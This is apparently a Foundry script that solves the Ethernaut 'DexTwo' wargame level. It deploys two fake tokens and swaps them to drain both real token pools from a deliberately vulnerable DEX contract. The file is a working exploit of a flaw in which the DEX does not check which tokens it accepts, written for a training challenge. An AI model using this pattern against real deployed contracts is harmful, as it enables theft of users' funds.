// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {DexTwo} from "../../src/Ethernaut/DexTwo.sol";
import {FakeToken} from "../../test/Ethernaut/DexTwo.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();

        address instanceAddress = 0x5EaF90De9d0e074F8f5979E1b275441265DAC292;
        uint256 amount = 100;
        FakeToken fakeToken1 = new FakeToken(instanceAddress, amount);
        FakeToken fakeToken2 = new FakeToken(instanceAddress, amount);
        DexTwo dexTwo = DexTwo(instanceAddress);

        fakeToken1.approve(instanceAddress, UINT256_MAX);
        fakeToken2.approve(instanceAddress, UINT256_MAX);

        dexTwo.swap(address(fakeToken1), dexTwo.token1(), amount);
        dexTwo.swap(address(fakeToken2), dexTwo.token2(), amount);

        vm.stopBroadcast();
    }
}
